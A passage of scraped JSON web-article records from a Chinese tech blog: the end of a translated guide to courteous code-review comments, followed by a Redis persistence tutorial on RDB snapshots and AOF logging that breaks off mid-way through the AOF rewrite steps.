的代码行数。相反，如果你写了一个冗长的示例来演示某个变动“更好”，而这个变动是基于你自己的个人品味（比如，风格变动），代码示例让你看起来固执己见，而不是慷慨大方。</p>\n<p>限制你自己在每个审查循环中只写两到三个代码示例。如果你开始为作者写整个变更表，这标志着你觉得作者没能力写自己的代码。</p>\n<h3>永远别说“你”</h3>\n<p>这听起来挺怪异的，但是听我说：永远别在代码审查中使用“你”这个字。</p>\n<p>在审查中做的决定应该是基于什么能让代码更好，而不是谁出的主意。你的队员在他们的变更表中倾注了大量心血，而且很可能为自己的工作感到骄傲。他们听到对其工作的批评，自然反应是摆出防御和保护的姿态。</p>\n<p>组织反馈所使用的措辞，以最小化激起队员戒备心的风险。讲清楚你是在批评代码，而不是程序员。当作者在评论中看到“你”这个字，会将他们的注意力从代码转移到自己身上。这增加了他们把批评私人化的风险。</p>\n<p>考虑一下这个无害的评论：</p>\n<blockquote><p><em>你拼错了“</em><em>successfully</em><em>”。</em></p></blockquote>\n<p>作者可以把这个批注理解成两种不同的意思：</p>\n<ul>\n<li><strong>理解</strong><strong> 1</strong>：嗨，好家伙！你拼错了“successfully”。但是我还是觉得你聪明！那可能就是个笔误。</li>\n</ul>\n<ul>\n<li><strong>理解</strong><strong> 2</strong>：你拼错了“successfully”，笨蛋。</li>\n</ul>\n<p>把这个跟省略了“你”的批注比较一下：</p>\n<blockquote><p><em>sucessfully -&gt; successfully</em></p></blockquote>\n<p>后者是一个简单的修正而不是对作者的审判。</p>\n<p>幸运地是，在重新写反馈时避免使用“你”并不难。</p>\n<h4><em>选择</em><em> 1</em><em>：用“我们”替换“你”</em></h4>\n<blockquote><p><em><strong>你</strong>能重命名这个变量，让它更具有描述性吗？比如 </em><em>seconds_remaining</em><em>。</em></p></blockquote>\n<p>变成：</p>\n<blockquote><p><em><strong>我们</strong>能重命名这个变量，让它更具有描述性吗？比如 seconds_remaining</em><em>。</em></p></blockquote>\n<p>“我们”加强了团队对代码的集体责任。作者可能跳槽到一个不同的公司去，你也可能，但是拥有这个代码的团队会一直以不同的形式存在。当你明显期望作者自己做某些事的时候，说“我们”听起来会比较傻，但是傻要比指责好。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1frr57qonq0j20lc0lcgpu.jpg\" width=\"690\" height=\"690\"></p>\n<h4><em>选择</em><em> 2</em><em>：移除句子的主语</em></h4>\n<p>另一个避免使用“你”的方法是用省略句子主语的简化句子：</p>\n<blockquote><p><em><strong>建议重命名</strong>为更具有描述性的名称，比如 </em><em>seconds_remaining</em><em>。</em></p></blockquote>\n<p>你可以用<a href=\"https://en.wikipedia.org/wiki/English_passive_voice\">被动语态</a>实现相似的效果。我在技术写作中一般会避免像瘟疫一样使用被动语态，但是它是个有用的方法来避免使用“你”。</p>\n<blockquote><p><em>变量<strong>应该被重命名</strong>为更具有描述性的名称，比如 </em><em>seconds_remaining</em><em>。</em></p></blockquote>\n<p>另一个选择是把它表述为一个问题，用“……如何”或者“……怎么样”开头：</p>\n<blockquote><p><em>把变量重命名为更具有表述性的名称<strong>怎么样</strong>？比如 </em><em>seconds_remaining</em><em>。</em></p></blockquote>\n<h4>把反馈表达成请求，而不是指令</h4>\n<p>代码审查相对平常的交流来说，要求更多的机智和谨慎，因为存在高风险把讨论转变成私人争论。你会期望审查者在审查中表示出礼貌，但是奇怪地是，我发现他们走向了另一个方向。多数人永远不会对同事说“给我订书机，再给我拿瓶汽水。”但是我看到过无数审查者用类似的指令来表达反馈，比如，“把这个类移到一个单独的文件里。”</p>\n<p>宁可在反馈中恼人地绅士。把批注表达成请求或者建议那样，而不是指令。</p>\n<p>比较用两种不同方式表达的同一个批注：</p>\n<table width=\"100%\">\n<thead>\n<tr>\n<td width=\"45%\"><strong>表达成指令的反馈</strong></td>\n<td width=\"54%\"><strong>表达成请求的反馈</strong></td>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td width=\"45%\">把 Foo 类移到一个单独的文件里。</td>\n<td width=\"54%\">我们能把 Foo 类移到一个单独的文件里吗？</td>\n</tr>\n</tbody>\n</table>\n<p>人们喜欢掌控自己的工作。向作者提出请求给他们带来自主意识。</p>\n<p>请求也让作者礼貌地反馈更容易。可能他们的选择是有合理的。如果把反馈表达成指令，来自作者的任何反馈都像违反指令。如果你把反馈表达成请求或者问题，作者能简单地回答你。</p>\n<p>比较对话的好斗程度，取决于审查者怎么表达他们的初始批注：</p>\n<table width=\"100%\">\n<thead>\n<tr>\n<td width=\"47%\"><strong>表达成指令的反馈（好斗的）</strong></td>\n<td width=\"52%\"><strong>表达成请求的反馈（合作的）</strong></td>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td width=\"47%\"><strong>审查者</strong>：把 Foo 类移到单独的文件里<br>\n<strong>作者</strong>：我不想这么做，因为那样就离 Bar 类太远了。客户几乎总会一起调用他们。</td>\n<td width=\"52%\"><strong>审查者</strong>：我们能把 Foo 类移到单独的文件里吗？<br>\n<strong>作者</strong>：可以，但是那样就离 Bar 类太远了，以及客户一般会一起使用这两个类。你觉得呢？</td>\n</tr>\n</tbody>\n</table>\n<p>看看当你<del>构建虚拟对话来证明观点</del>把批注表达成请求而非指令的时候，对话变得多么有礼貌。</p>\n<h4>把批注与原则联系在一起，而不是观点</h4>\n<p>当你给作者写批注时，既要给出变更建议，也要给出变更的<em>理由</em>。“现在，这个类既负责下载文件，也负责解析文件。我们应该依照<a href=\"https://en.wikipedia.org/wiki/Single_responsibility_principle\">单一责任原则</a>，把它拆分成一个下载类和一个解析类。”这么说会更好，而不是说“我们应该把这个类分成两个。”</p>\n<p>让你的批注有原则性的立足点，这样能让讨论走向更积极的方向更有建设性。但你有一个具体的原因，比如“我们应该把这个函数写成私有函数，来最小化 public 借口类”，作者就不能简单地回复“不，我倾向于我的方法。”更确切地说，他们<em>可以</em>，但是因为你演示了改动如何满足目标，而他们只陈述了一个偏好，他们会看起来很傻。</p>\n<p>软件开发既是艺术也是科学。你不可能永远都能用确定的原则来明确表达代码到底哪里出了问题。有时候代码只是难看或者不符合直觉，不容易确定为什么。在这些情况下，解释你能怎么做，但是保持客观性。如果你说“<strong>我</strong>发现这不容易理解”，这至少是个客观的陈述；相反，“<strong>这</strong>莫名其妙”是一个价值判断，不一定适用于所有人。</p>\n<p>尽可能以链接的形式提供支持证据。团队风格指南的相关部分是你能提供的最佳链接。你也可以链接到语言或者库的文件。高票 <a href=\"https://stackoverflow.com/\">StackOverflow</a> 回答也行，但是离权威文件越远，你的证据变得越不稳固。</p>\n<h2>第二部分：即将上线</h2>\n<p>敬请期待其他小技巧，包括：</p>\n<ul>\n<li>处理特别大的代码审查</li>\n</ul>\n<ul>\n<li>识别给予表扬的机会</li>\n</ul>\n<ul>\n<li>尊重审核的，以及</li>\n</ul>\n<ul>\n<li>化解僵局</li>\n</ul>\n<p><em>由 <a href=\"https://www.upwork.com/fl/samanthamason\">Samantha Mason</a> 编辑。插图来自 <a href=\"https://www.linkedin.com/in/lolo-ology/\">Loraine Yow</a>。感谢 <a href=\"https://twitter.com/global4g\">@global4g</a>为这篇文章的早期版本提供宝贵的反馈。</em></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113665\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113665votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113665\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/chenyahui\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/chenyahui/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/chenyahui/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 22</a> · <a title=\"QQ：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：564968845\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Code Review,代码审查", "url": "http://blog.jobbole.com/113665/", "url_obj_id": "a954aebbcc6c42bb9302d1a79cefaa26"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "title": "深入学习 Redis（2）：持久化", "create_date": "2018/06/07 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/kismetv/p/9137897.html\">编程迷思</a>   </div><h2>前言</h2>\n<p>在上一篇文章中，介绍了<a href=\"http://blog.jobbole.com/113789/\" target=\"_blank\">Redis的内存模型</a>，从这篇文章开始，将依次介绍Redis高可用相关的知识——持久化、复制(及读写分离)、哨兵、以及集群。</p>\n<p>本文将先说明上述几种技术分别解决了Redis高可用的什么问题；然后详细介绍Redis的持久化技术，主要是RDB和AOF两种持久化方案；在介绍RDB和AOF方案时，不仅介绍其作用及操作方法，同时介绍持久化实现的一些原理细节及需要注意的问题。最后，介绍在实际使用中，持久化方案的选择，以及经常遇到的问题等。</p>\n<h1>一、Redis高可用概述</h1>\n<p>在介绍Redis高可用之前，先说明一下在Redis的语境中高可用的含义。</p>\n<p>我们知道，在web服务器中，高可用是指服务器可以正常访问的时间，衡量的标准是在多长时间内可以提供正常服务（99.9%、99.99%、99.999% 等等）。但是在Redis语境中，高可用的含义似乎要宽泛一些，除了保证提供正常服务(如主从分离、快速容灾技术)，还需要考虑数据容量的扩展、数据安全不会丢失等。</p>\n<p>在Redis中，实现高可用的技术主要包括持久化、复制、哨兵和集群，下面分别说明它们的作用，以及解决了什么样的问题。</p>\n<ol>\n<li>持久化：持久化是最简单的高可用方法(有时甚至不被归为高可用的手段)，主要作用是数据备份，即将数据存储在硬盘，保证数据不会因进程退出而丢失。</li>\n<li>复制：复制是高可用Redis的基础，哨兵和集群都是在复制基础上实现高可用的。复制主要实现了数据的多机备份，以及对于读操作的负载均衡和简单的故障恢复。缺陷：故障恢复无法自动化；写操作无法负载均衡；存储能力受到单机的限制。</li>\n<li>哨兵：在复制的基础上，哨兵实现了自动化的故障恢复。缺陷：写操作无法负载均衡；存储能力受到单机的限制。</li>\n<li>集群：通过集群，Redis解决了写操作无法负载均衡，以及存储能力受到单机限制的问题，实现了较为完善的高可用方案。</li>\n</ol>\n<h1>二、Redis 持久化概述</h1>\n<p>持久化的功能：Redis是内存数据库，数据都是存储在内存中，为了避免进程退出导致数据的永久丢失，需要定期将Redis中的数据以某种形式(数据或命令)从内存保存到硬盘；当下次Redis重启时，利用持久化文件实现数据恢复。除此之外，为了进行灾难备份，可以将持久化文件拷贝到一个远程位置。</p>\n<p>Redis持久化分为RDB持久化和AOF持久化<strong>：前者将当前数据保存到硬盘，后者则是将每次执行的写命令保存到硬盘（类似于MySQL的binlog）；</strong>由于AOF持久化的实时性更好，即当进程意外退出时丢失的数据更少，因此AOF是目前主流的持久化方式，不过RDB持久化仍然有其用武之地。</p>\n<p>下面依次介绍RDB持久化和AOF持久化；由于Redis各个版本之间存在差异，如无特殊说明，以Redis3.0为准。</p>\n<h1>三、RDB持久化</h1>\n<p>RDB持久化是将当前进程中的数据生成快照保存到硬盘(因此也称作快照持久化)，保存的文件后缀是rdb；当Redis重新启动时，可以读取快照文件恢复数据。</p>\n<h2>1. 触发条件</h2>\n<p>RDB持久化的触发分为手动触发和自动触发两种。</p>\n<h3>1) 手动触发</h3>\n<p>save命令和bgsave命令都可以生成RDB文件。</p>\n<p>save命令会阻塞Redis服务器进程，直到RDB文件创建完毕为止，在Redis服务器阻塞期间，服务器不能处理任何命令请求。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/662665d4fe41bbae40cff2548bc1c4ee.png\" alt=\"\"></p>\n<p>而bgsave命令会创建一个子进程，由子进程来负责创建RDB文件，父进程(即Redis主进程)则继续处理请求。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/fbe173ede64bc88f834bc25d89f8f44f.png\" alt=\"\"></p>\n<p>此时服务器执行日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/fbb24a124ecb5ddf9c02d425ddc488d2.png\" alt=\"\"></p>\n<p>bgsave命令执行过程中，只有fork子进程时会阻塞服务器，而对于save命令，整个过程都会阻塞服务器，因此save已基本被废弃，线上环境要杜绝save的使用；后文中也将只介绍bgsave命令。此外，在自动触发RDB持久化时，Redis也会选择bgsave而不是save来进行持久化；下面介绍自动触发RDB持久化的条件。</p>\n<h3>2) 自动触发</h3>\n<p><strong>save m n</strong></p>\n<p>自动触发最常见的情况是在配置文件中通过save m n，指定当m秒内发生n次变化时，会触发bgsave。</p>\n<p>例如，查看redis的默认配置文件(Linux下为redis根目录下的redis.conf)，可以看到如下配置信息：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/940eea59eb4ff44da2ba1a95bf28ab2c.png\" alt=\"\"></p>\n<p>其中save 900 1的含义是：当时间到900秒时，如果redis数据发生了至少1次变化，则执行bgsave；save 300 10和save 60 10000同理。当三个save条件满足任意一个时，都会引起bgsave的调用。</p>\n<p><strong>save m n的实现原理</strong></p>\n<p>Redis的save m n，是通过serverCron函数、dirty计数器、和lastsave时间戳来实现的。</p>\n<p>serverCron是Redis服务器的周期性操作函数，默认每隔100ms执行一次；该函数对服务器的状态进行维护，其中一项工作就是检查 save m n 配置的条件是否满足，如果满足就执行bgsave。</p>\n<p>dirty计数器是Redis服务器维持的一个状态，记录了上一次执行bgsave/save命令后，服务器状态进行了多少次修改(包括增删改)；而当save/bgsave执行完成后，会将dirty重新置为0。</p>\n<p>例如，如果Redis执行了set mykey helloworld，则dirty值会+1；如果执行了sadd myset v1 v2 v3，则dirty值会+3；注意dirty记录的是服务器进行了多少次修改，而不是客户端执行了多少修改数据的命令。</p>\n<p>lastsave时间戳也是Redis服务器维持的一个状态，记录的是上一次成功执行save/bgsave的时间。</p>\n<p>save m n的原理如下：每隔100ms，执行serverCron函数；在serverCron函数中，遍历save m n配置的保存条件，只要有一个条件满足，就进行bgsave。对于每一个save m n条件，只有下面两条同时满足时才算满足：</p>\n<p>（1）当前时间-lastsave &gt; m</p>\n<p>（2）dirty &gt;= n</p>\n<p><strong>save m n 执行日志</strong></p>\n<p>下图是save m n触发bgsave执行时，服务器打印日志的情况：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/969e9ec6f50fedbdd85b68d2becb5b9a.png\" alt=\"\"></p>\n<p><strong>其他自动触发机制</strong></p>\n<p>除了save m n 以外，还有一些其他情况会触发bgsave：</p>\n<ul>\n<li>在主从复制场景下，如果从节点执行全量复制操作，则主节点会执行bgsave命令，并将rdb文件发送给从节点</li>\n<li>执行shutdown命令时，自动执行rdb持久化，如下图所示：</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/026e36b9dd1e7d05a54e83405e4a8d19.png\" alt=\"\"></p>\n<h2>2. 执行流程</h2>\n<p>前面介绍了触发bgsave的条件，下面将说明bgsave命令的执行流程，如下图所示(图片来源：https://blog.csdn.net/a1007720052/article/details/79126253)：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/d7320b5cc683f2e4eafeff120f5242cc.png\" alt=\"\"></p>\n<p>图片中的5个步骤所进行的操作如下：</p>\n<p>1)  Redis父进程首先判断：当前是否在执行save，或bgsave/bgrewriteaof（后面会详细介绍该命令）的子进程，如果在执行则bgsave命令直接返回。bgsave/bgrewriteaof 的子进程不能同时执行，主要是基于性能方面的考虑：两个并发的子进程同时执行大量的磁盘写操作，可能引起严重的性能问题。</p>\n<p>2)  父进程执行fork操作创建子进程，这个过程中父进程是阻塞的，Redis不能执行来自客户端的任何命令</p>\n<p>3)  父进程fork后，bgsave命令返回”Background saving started”信息并不再阻塞父进程，并可以响应其他命令</p>\n<p>4)  子进程创建RDB文件，根据父进程内存快照生成临时快照文件，完成后对原有文件进行原子替换</p>\n<p>5)  子进程发送信号给父进程表示完成，父进程更新统计信息</p>\n<h2>3. RDB文件</h2>\n<p>RDB文件是经过压缩的二进制文件，下面介绍关于RDB文件的一些细节。</p>\n<p><strong>存储路径</strong></p>\n<p>RDB文件的存储路径既可以在启动前配置，也可以通过命令动态设定。</p>\n<p>配置：dir配置指定目录，dbfilename指定文件名。默认是Redis根目录下的dump.rdb文件。</p>\n<p>动态设定：Redis启动后也可以动态修改RDB存储路径，在磁盘损害或空间不足时非常有用；执行命令为config set dir {newdir}和config set dbfilename {newFileName}。如下所示(Windows环境)：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/d9908e2d6d9a38ed4b11ae1f2e976cd1.png\" alt=\"\"></p>\n<p><strong>RDB文件格式</strong></p>\n<p>RDB文件格式如下图所示（图片来源：《Redis设计与实现》）：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/58d5a97304a02565e67339cabadade6c.png\" alt=\"\"></p>\n<p>其中各个字段的含义说明如下：</p>\n<p>1)  REDIS：常量，保存着”REDIS”5个字符。</p>\n<p>2)  db_version：RDB文件的版本号，注意不是Redis的版本号。</p>\n<p>3)  SELECTDB 0 pairs：表示一个完整的数据库(0号数据库)，同理SELECTDB 3 pairs表示完整的3号数据库；只有当数据库中有键值对时，RDB文件中才会有该数据库的信息(上图所示的Redis中只有0号和3号数据库有键值对)；如果Redis中所有的数据库都没有键值对，则这一部分直接省略。其中：SELECTDB是一个常量，代表后面跟着的是数据库号码；0和3是数据库号码；pairs则存储了具体的键值对信息，包括key、value值，及其数据类型、内部编码、过期时间、压缩信息等等。</p>\n<p>4)  EOF：常量，标志RDB文件正文内容结束。</p>\n<p>5)  check_sum：前面所有内容的校验和；Redis在载入RBD文件时，会计算前面的校验和并与check_sum值比较，判断文件是否损坏。</p>\n<p><strong>压缩</strong></p>\n<p>Redis默认采用LZF算法对RDB文件进行压缩。虽然压缩耗时，但是可以大大减小RDB文件的体积，因此压缩默认开启；可以通过命令关闭：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/4d88ca2d61427189a211b9652d4d5dc6.png\" alt=\"\"></p>\n<p>需要注意的是，RDB文件的压缩并不是针对整个文件进行的，而是对数据库中的字符串进行的，且只有在字符串达到一定长度(20字节)时才会进行。</p>\n<h2>4. 启动时加载</h2>\n<p>RDB文件的载入工作是在服务器启动时自动执行的，并没有专门的命令。但是由于AOF的优先级更高，因此当AOF开启时，Redis会优先载入AOF文件来恢复数据；只有当AOF关闭时，才会在Redis服务器启动时检测RDB文件，并自动载入。服务器载入RDB文件期间处于阻塞状态，直到载入完成为止。</p>\n<p>Redis启动日志中可以看到自动载入的执行：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1ae2921155458ca1803759968945bc9f.png\" alt=\"\"></p>\n<p>Redis载入RDB文件时，会对RDB文件进行校验，如果文件损坏，则日志中会打印错误，Redis启动失败。</p>\n<h2>5. RDB常用配置总结</h2>\n<p>下面是RDB常用的配置项，以及默认值；前面介绍过的这里不再详细介绍。</p>\n<ul>\n<li>save m n：bgsave自动触发的条件；如果没有save m n配置，相当于自动的RDB持久化关闭，不过此时仍可以通过其他方式触发</li>\n<li>stop-writes-on-bgsave-error yes：当bgsave出现错误时，Redis是否停止执行写命令；设置为yes，则当硬盘出现问题时，可以及时发现，避免数据的大量丢失；设置为no，则Redis无视bgsave的错误继续执行写命令，当对Redis服务器的系统(尤其是硬盘)使用了监控时，该选项考虑设置为no</li>\n<li>rdbcompression yes：是否开启RDB文件压缩</li>\n<li>rdbchecksum yes：是否开启RDB文件的校验，在写入文件和读取文件时都起作用；关闭checksum在写入文件和启动文件时大约能带来10%的性能提升，但是数据损坏时无法发现</li>\n<li>dbfilename dump.rdb：RDB文件名</li>\n<li>dir ./：RDB文件和AOF文件所在目录</li>\n</ul>\n<h1>四、AOF持久化</h1>\n<p>RDB持久化是将进程数据写入文件，而AOF持久化(即Append Only File持久化)，则是将Redis执行的每次写命令记录到单独的日志文件中（有点像MySQL的binlog）；当Redis重启时再次执行AOF文件中的命令来恢复数据。</p>\n<p>与RDB相比，AOF的实时性更好，因此已成为主流的持久化方案。</p>\n<h2>1. 开启AOF</h2>\n<p>Redis服务器默认开启RDB，关闭AOF；要开启AOF，需要在配置文件中配置：</p>\n<p>appendonly yes</p>\n<h2>2. 执行流程</h2>\n<p>由于需要记录Redis的每条写命令，因此AOF不需要触发，下面介绍AOF的执行流程。</p>\n<p>AOF的执行流程包括：</p>\n<ul>\n<li>命令追加(append)：将Redis的写命令追加到缓冲区aof_buf；</li>\n<li>文件写入(write)和文件同步(sync)：根据不同的同步策略将aof_buf中的内容同步到硬盘；</li>\n<li>文件重写(rewrite)：定期重写AOF文件，达到压缩的目的。</li>\n</ul>\n<h3>1) 命令追加(append)</h3>\n<p>Redis先将写命令追加到缓冲区，而不是直接写入文件，主要是为了避免每次有写命令都直接写入硬盘，导致硬盘IO成为Redis负载的瓶颈。</p>\n<p>命令追加的格式是Redis命令请求的协议格式，它是一种纯文本格式，具有兼容性好、可读性强、容易处理、操作简单避免二次开销等优点；具体格式略。在AOF文件中，除了用于指定数据库的select命令（如select 0 为选中0号数据库）是由Redis添加的，其他都是客户端发送来的写命令。</p>\n<h3>2) 文件写入(write)和文件同步(sync)</h3>\n<p>Redis提供了多种AOF缓存区的同步文件策略，策略涉及到操作系统的write函数和fsync函数，说明如下：</p>\n<p>为了提高文件写入效率，在现代操作系统中，当用户调用write函数将数据写入文件时，操作系统通常会将数据暂存到一个内存缓冲区里，当缓冲区被填满或超过了指定时限后，才真正将缓冲区的数据写入到硬盘里。这样的操作虽然提高了效率，但也带来了安全问题：如果计算机停机，内存缓冲区中的数据会丢失；因此系统同时提供了fsync、fdatasync等同步函数，可以强制操作系统立刻将缓冲区中的数据写入到硬盘里，从而确保数据的安全性。</p>\n<p>AOF缓存区的同步文件策略由参数appendfsync控制，各个值的含义如下：</p>\n<ul>\n<li>always：命令写入aof_buf后立即调用系统fsync操作同步到AOF文件，fsync完成后线程返回。这种情况下，每次有写命令都要同步到AOF文件，硬盘IO成为性能瓶颈，Redis只能支持大约几百TPS写入，严重降低了Redis的性能；即便是使用固态硬盘（SSD），每秒大约也只能处理几万个命令，而且会大大降低SSD的寿命。</li>\n<li>no：命令写入aof_buf后调用系统write操作，不对AOF文件做fsync同步；同步由操作系统负责，通常同步周期为30秒。这种情况下，文件同步的时间不可控，且缓冲区中堆积的数据会很多，数据安全性无法保证。</li>\n<li>everysec：命令写入aof_buf后调用系统write操作，write完成后线程返回；fsync同步文件操作由专门的线程每秒调用一次。<strong>everysec是前述两种策略的折中，是性能和数据安全性的平衡，因此是Redis的默认配置，也是我们推荐的配置。</strong></li>\n</ul>\n<h3>3) 文件重写(rewrite)</h3>\n<p>随着时间流逝，Redis服务器执行的写命令越来越多，AOF文件也会越来越大；过大的AOF文件不仅会影响服务器的正常运行，也会导致数据恢复需要的时间过长。</p>\n<p>文件重写是指定期重写AOF文件，减小AOF文件的体积。需要注意的是，<strong>AOF重写是把Redis进程内的数据转化为写命令，同步到新的AOF文件；不会对旧的AOF文件进行任何读取、写入操作!</strong></p>\n<p>关于文件重写需要注意的另一点是：对于AOF持久化来说，文件重写虽然是强烈推荐的，但并不是必须的；即使没有文件重写，数据也可以被持久化并在Redis启动的时候导入；因此在一些实现中，会关闭自动的文件重写，然后通过定时任务在每天的某一时刻定时执行。</p>\n<p>文件重写之所以能够压缩AOF文件，原因在于：</p>\n<ul>\n<li>过期的数据不再写入文件</li>\n<li>无效的命令不再写入文件：如有些数据被重复设值(set mykey v1, set mykey v2)、有些数据被删除了(sadd myset v1, del myset)等等</li>\n<li>多条命令可以合并为一个：如sadd myset v1, sadd myset v2, sadd myset v3可以合并为sadd myset v1 v2 v3。不过为了防止单条命令过大造成客户端缓冲区溢出，对于list、set、hash、zset类型的key，并不一定只使用一条命令；而是以某个常量为界将命令拆分为多条。这个常量在redis.h/REDIS_AOF_REWRITE_ITEMS_PER_CMD中定义，不可更改，3.0版本中值是64。</li>\n</ul>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/dbd265625fa30c7c5837136e70171248.png\" alt=\"\"></p>\n<p>通过上述内容可以看出，由于重写后AOF执行的命令减少了，文件重写既可以减少文件占用的空间，也可以加快恢复速度。</p>\n<p><strong>文件重写的触发</strong></p>\n<p>文件重写的触发，分为手动触发和自动触发：</p>\n<p>手动触发：直接调用bgrewriteaof命令，该命令的执行与bgsave有些类似：都是fork子进程进行具体的工作，且都只有在fork时阻塞。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a3bfe8ea04147795290a39f4debe1602.png\" alt=\"\"></p>\n<p>此时服务器执行日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/c81bed0689ff70ea950574eacb26684c.png\" alt=\"\"></p>\n<p>自动触发：根据auto-aof-rewrite-min-size和auto-aof-rewrite-percentage参数，以及aof_current_size和aof_base_size状态确定触发时机。</p>\n<ul>\n<li>auto-aof-rewrite-min-size：执行AOF重写时，文件的最小体积，默认值为64MB。</li>\n<li>auto-aof-rewrite-percentage：执行AOF重写时，当前AOF大小(即aof_current_size)和上一次重写时AOF大小(aof_base_size)的比值。</li>\n</ul>\n<p>其中，参数可以通过config get命令查看：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/ab802fac49820819fd9f5896ebaaaeb5.png\" alt=\"\"></p>\n<p>状态可以通过info persistence查看：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/e1385eb5e949e1cd2155ec601ad65fb7.png\" alt=\"\"></p>\n<p>只有当auto-aof-rewrite-min-size和auto-aof-rewrite-percentage两个参数同时满足时，才会自动触发AOF重写，即bgrewriteaof操作。</p>\n<p>自动触发bgrewriteaof时，可以看到服务器日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/402b56947d9affe03aa1e13bad670e45.png\" alt=\"\"></p>\n<p><strong>文件重写的流程</strong></p>\n<p>文件重写流程如下图所示(图片来源：http://www.cnblogs.com/yangmingxianshen/p/8373205.html)：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/1324311267755f0686b519bb6064f99f.png\" alt=\"\"></p>\n<p>关于文件重写的流程，有两点需要特别注意：(1)重写由父进程fork子进程进行；(2)重写期间Redis执行的写命令，需要追加到新的AOF文件中，为此Redis引入了aof_rewrite_buf缓存。</p>\n<p>对照上图，文件重写的流程如下：</p>\n<p>1) Redis父进程首先判断当前是否存在正在执行 bgsave/bgrewriteaof的子进程，如果存在则bgrewriteaof命令直接返回，如果存在bgsave命令则等bgsave执行完成后再执行。前面曾介绍过，这个主要是基于性能方面的考虑。</p>\n<p>2) 父进程执行fork操作创建子进程，这个过程中父进程是阻塞的。</p>\n<p>3.1) 父进程fork后，bgrewriteaof命令返回”Background append only file rewrite started”信息并不再阻塞父进程，并可以响应其他命令。<strong>Redis的所有写命令依然写入AOF缓冲区，并根据appendfsync策略同步到硬盘，保证原有AOF机制的正确。</strong></p>\n<p>3.2) 